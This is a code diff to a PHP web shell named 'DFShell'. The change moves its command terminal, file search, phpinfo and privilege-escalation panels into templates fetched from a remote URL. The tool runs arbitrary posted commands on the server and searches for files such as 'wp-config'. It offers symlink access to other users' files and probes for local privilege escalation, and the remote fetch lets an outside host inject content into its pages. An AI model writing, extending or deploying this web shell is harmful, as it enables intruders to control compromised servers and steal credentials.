@@ -864,24 +864,32 @@ class DFShell{
                     foreach($GLOBALS['DFSCmd'] as $c){ if(!in_array($c,$dis)){ $avail=$c; break; } }
                 }
                 $lastCmd = $GLOBALS['DFConfig'][1]['dfscmd'] ?? '';
-                echo "<section id='cmd_area'>";
-                echo "<p style='color:#FFD700;font-size:13px'>cwd: ".$this->DFSH($cwd)." &nbsp;|&nbsp; exec: <b>".$this->DFSH($avail)."</b></p>";
-                // v2.6: ajax terminal (no page reload) — classic form kept below as fallback
-                echo "<div id='ajaxterm' style='background:#000;border:1px solid #4a3d05;border-radius:8px;padding:10px;max-height:300px;overflow-y:auto;font-family:monospace;font-size:12px;color:#ddd;margin-bottom:8px'><div style='color:#666'>Ajax terminal ready — type a command below. History: up/down arrows.</div></div>";
-                echo "<form id='ajaxform' action='' method='POST' autocomplete='OFF' onsubmit='return dfsAjaxRun()'><input id='ajaxinput' type='text' placeholder='whoami (ajax, no reload)' autofocus style='width:100%'></form>";
+                // v2.6: terminal UI hosted in contents/others.html segment [8] — template-driven
+                $termUi = explode('||',$GLOBALS['DFSyntax'][0](self::$remote_url.'/others.html'))[8];
+                $o = '';
+                if($lastCmd!=="" && !isset($GLOBALS['DFConfig'][1]['dfajax'])){
+                    ob_start();
+                    $this->DFSExecute($lastCmd);
+                    $o = $this->DFSH(ob_get_clean());
+                }
+                $termUi = str_replace('%{CWD}%',$this->DFSH($cwd),$termUi);
+                $termUi = str_replace('%{EXEC}%',$this->DFSH($avail),$termUi);
+                $termUi = str_replace('%{OUT}%',$o,$termUi);
+                $termUi = str_replace('%{LASTCMD}%',$this->DFSH($lastCmd),$termUi);
+                echo $termUi;
                 echo "<script>
                 var dfsHist=[],dfsHi=-1;
                 function dfsAjaxRun(){
                     var inp=document.getElementById('ajaxinput'),term=document.getElementById('ajaxterm');
                     var cmd=inp.value; if(!cmd){return false;}
                     dfsHist.push(cmd); dfsHi=dfsHist.length;
-                    term.innerHTML+=\"<div><span style='color:#FFD700'>&gt; </span>\"+cmd.replace(/&/g,'&amp;').replace(/</g,'&lt;')+\"</div>\";
+                    term.innerHTML+=\"<div class='dfs-ajax-cmd'>&gt; \"+cmd.replace(/&/g,'&amp;').replace(/</g,'&lt;')+\"</div>\";
                     inp.value=''; term.scrollTop=term.scrollHeight;
                     var fd=new FormData(); fd.append('dfscmd',cmd); fd.append('dfajax','1');
                     fetch(window.location.href,{method:'POST',body:fd,credentials:'same-origin'}).then(function(r){return r.text();}).then(function(t){
-                        term.innerHTML+=\"<pre style='margin:2px 0 8px;color:#69e01f;white-space:pre-wrap'>\"+(t.replace(/&/g,'&amp;').replace(/</g,'&lt;')||'(no output)')+\"</pre>\";
+                        term.innerHTML+=\"<pre class='dfs-ajax-out'>\"+(t.replace(/&/g,'&amp;').replace(/</g,'&lt;')||'(no output)')+\"</pre>\";
                         term.scrollTop=term.scrollHeight;
-                    }).catch(function(e){ term.innerHTML+=\"<div style='color:red'>request failed</div>\"; });
+                    }).catch(function(e){ term.innerHTML+=\"<div class='dfs-ajax-err'>request failed</div>\"; });
                     return false;
                 }
                 document.getElementById('ajaxinput').addEventListener('keydown',function(e){
@@ -889,18 +897,6 @@ class DFShell{
                     if(e.key==='ArrowDown'&&dfsHist.length){e.preventDefault();if(dfsHi<dfsHist.length-1)dfsHi++;else{dfsHi=dfsHist.length;this.value='';return;}this.value=dfsHist[dfsHi]||'';}
                 });
                 </script>";
-                echo "<details style='margin-top:8px'><summary style='cursor:pointer;color:#666;font-size:12px'>Classic form (page reload fallback)</summary>";
-                echo "<form action='' method='POST' autocomplete='OFF'><textarea class='cmd_response' readonly='TRUE'>";
-                if(isset($GLOBALS['DFConfig'][1]['dfscmd']) && $lastCmd!=="" && !isset($GLOBALS['DFConfig'][1]['dfajax'])){
-                    ob_start();
-                    $this->DFSExecute($lastCmd);
-                    $o = ob_get_clean();
-                    echo $this->DFSH($o);
-                }
-                echo "</textarea><br><input type='text' name='dfscmd' placeholder='whoami' value='".$this->DFSH($lastCmd)."'><br><button>Execute</button></form>";
-                echo "</details>";
-                echo "<p style='color:#666;font-size:12px'>Tip: new in v2.6 — ajax terminal above runs without reload.</p>";
-                echo "</section>";
             break;
             case "sym":
                 echo "<section class='symlinkarea'><div class='symex'><label>Example : /home/%{user}%/public_html/target_file.php || /var/www/%{user}%/html/file.php</label></div>";
@@ -1515,18 +1511,17 @@ class DFShell{
                 $slashtype = $this->DFSSlash();
                 $basePath = isset($this->query[0]) ? $this->Dec($this->query[0]) : getcwd();
                 if($basePath===""||$basePath===false){ $basePath = getcwd(); }
-                echo "<section class='searchbox'><h3>File Search <small style='color:#888'>(v2.3)</small></h3>";
-                echo "<form action='' method='POST'><table>";
-                echo "<tr><td><label>Base path : </label></td><td><input type='text' name='searchpath' value='".$this->DFSH($_POST['searchpath'] ?? $basePath)."' style='width:320px'></td></tr>";
-                echo "<tr><td><label>Keyword : </label></td><td><input type='text' name='searchkey' value='".$this->DFSH($_POST['searchkey'] ?? '')."' placeholder='wp-config'></td></tr>";
-                echo "<tr><td><label>Extension : </label></td><td><input type='text' name='searchext' value='".$this->DFSH($_POST['searchext'] ?? '')."' placeholder='php (optional)'></td></tr>";
-                echo "<tr><td></td><td><input type='submit' name='dfsearch' value='Search'></td></tr>";
-                echo "</table></form><div class='scanresults'>";
+                // v2.6: search form hosted in contents/others.html segment [5] — template-driven
+                $searchUi = explode('||',$GLOBALS['DFSyntax'][0](self::$remote_url.'/others.html'))[5];
+                $searchUi = str_replace('%{BASE}%',$this->DFSH($_POST['searchpath'] ?? $basePath),$searchUi);
+                $searchUi = str_replace('%{KEY}%',$this->DFSH($_POST['searchkey'] ?? ''),$searchUi);
+                $searchUi = str_replace('%{EXT}%',$this->DFSH($_POST['searchext'] ?? ''),$searchUi);
+                $results = "";
                 if(isset($GLOBALS['DFConfig'][1]['dfsearch'])){
                     $spath = rtrim($GLOBALS['DFConfig'][1]['searchpath'],'\\/');
                     $skey = $GLOBALS['DFConfig'][1]['searchkey'];
                     $sext = ltrim(trim($GLOBALS['DFConfig'][1]['searchext']),'.');
-                    if(!is_dir($spath)){ echo "<p style='color:red'>Not a directory: ".$this->DFSH($spath)."</p>"; }
+                    if(!is_dir($spath)){ $results = "<p style='color:red'>Not a directory: ".$this->DFSH($spath)."</p>"; }
                     else{
                         @set_time_limit(0);
                         $found = array(); $scanned = 0;
@@ -1541,18 +1536,19 @@ class DFShell{
                                 if($sext!=="" && strtolower(pathinfo($bn,PATHINFO_EXTENSION))!==strtolower($sext)){ continue; }
                                 $found[] = $f->getPathname();
                             }
-                        }catch(Exception $e){ echo "<p style='color:red'>".$this->DFSH($e->getMessage())."</p>"; }
-                        echo "<p>Scanned ~$scanned entries — <b>".count($found)."</b> match(es)".(count($found)>=500?" (capped at 500)":"")."</p>";
+                        }catch(Exception $e){ $results = "<p style='color:red'>".$this->DFSH($e->getMessage())."</p>"; }
+                        $results .= "<p>Scanned ~$scanned entries — <b>".count($found)."</b> match(es)".(count($found)>=500?" (capped at 500)":"")."</p>";
                         if(count($found)){
-                            echo "<table class='scantable'><tr><th>Path</th><th>Size</th></tr>";
+                            $results .= "<table class='scantable'><tr><th>Path</th><th>Size</th></tr>";
                             foreach($found as $fp){
-                                echo "<tr><td>".$this->DFSH($fp)."</td><td>".(is_file($fp)?$this->DFSFormat(@filesize($fp)):"-")."</td></tr>";
+                                $results .= "<tr><td>".$this->DFSH($fp)."</td><td>".(is_file($fp)?$this->DFSFormat(@filesize($fp)):"-")."</td></tr>";
                             }
-                            echo "</table>";
+                            $results .= "</table>";
                         }
                     }
                 }
-                echo "</div></section>";
+                $searchUi = str_replace('%{RESULTS}%',$results,$searchUi);
+                echo $searchUi;
             break;
             case "copy":
                 $slashtype = $this->DFSSlash();
@@ -1613,29 +1609,20 @@ class DFShell{
                 echo "</section>";
             break;
             case "phpinfo":
-                echo "<section class='fileinfo'><h3>PHP Info</h3>";
-                echo "<style>"
-                .".pi-dark{background:#000!important;color:#FFD700;border-radius:10px;padding:10px;overflow:auto;max-height:600px;text-align:left}"
-                .".pi-dark table{width:100%;border-collapse:collapse;background:#000!important;color:#ddd;margin-bottom:12px}"
-                .".pi-dark td,.pi-dark th{border:1px solid #4a3d05!important;padding:5px 8px;font-size:12px;background:#000!important;color:#ddd!important}"
-                .".pi-dark tr.h td,.pi-dark tr.h th{background:#1a1500!important;color:#FFD700!important;font-weight:bold}"
-                .".pi-dark td.e,.pi-dark th.e{background:#0d0b00!important;color:#FFD700!important}"
-                .".pi-dark td.v{background:#000!important;color:#ddd!important;word-break:break-all}"
-                .".pi-dark a{color:#69e01f!important}"
-                .".pi-dark font{color:#ddd!important}"
-                .".pi-dark hr{border-color:#4a3d05}"
-                .".pi-dark h1,.pi-dark h2{color:#FFD700!important}"
-                ."</style>";
-                echo "<div class='pi-dark'>";
+                // v2.6: wrapper hosted in contents/others.html segment [7] — template-driven
+                $piUi = explode('||',$GLOBALS['DFSyntax'][0](self::$remote_url.'/others.html'))[7];
                 ob_start(); phpinfo(); $pi = ob_get_clean();
                 // strip outer html + php's own <style> to embed safely in dark theme
                 $pi = preg_replace('%^.*<body>%s','',$pi); $pi = preg_replace('%</body>.*$%s','',$pi);
                 $pi = preg_replace('%<style.*?</style>%s','',$pi);
-                echo $pi;
-echo "</div></section>";
+                $piUi = str_replace('%{PI}%',$pi,$piUi);
+                echo $piUi;
              break;
             case "lpe":
-                echo $this->DFSLPE();
+                // v2.6: header + intro hosted in contents/others.html segment [6] — template-driven
+                $lpeUi = explode('||',$GLOBALS['DFSyntax'][0](self::$remote_url.'/others.html'))[6];
+                $lpeUi = str_replace('%{LPE}%',$this->DFSLPE(),$lpeUi);
+                echo $lpeUi;
              break;
          }
      }
@@ -3199,8 +3186,8 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
         // Phase 1: Detect OS
         $this->DFSLPEDetectOS();
 
-        $lpeResults = "<section class='lpe'>";
-        $lpeResults .= "<h3>Auto Privilege Escalation Audit <small style='color:#888'>(v2.6 — Cross-Platform)</small></h3>";
+        // v2.6: section header + intro now come from contents/others.html segment [6]
+        $lpeResults = "<div class='lpe-findings'>";
 
         // System info banner
         $lpeResults .= "<div class='lpe-finding lpe-info'>";
@@ -3288,7 +3275,7 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
         $lpeResults .= " | ".count($this->lpeTechniques)." techniques evaluated</h4>";
         $lpeResults .= "</div>";
 
-        $lpeResults .= "</section>";
+        $lpeResults .= "</div>";
         return $lpeResults;
     }
 
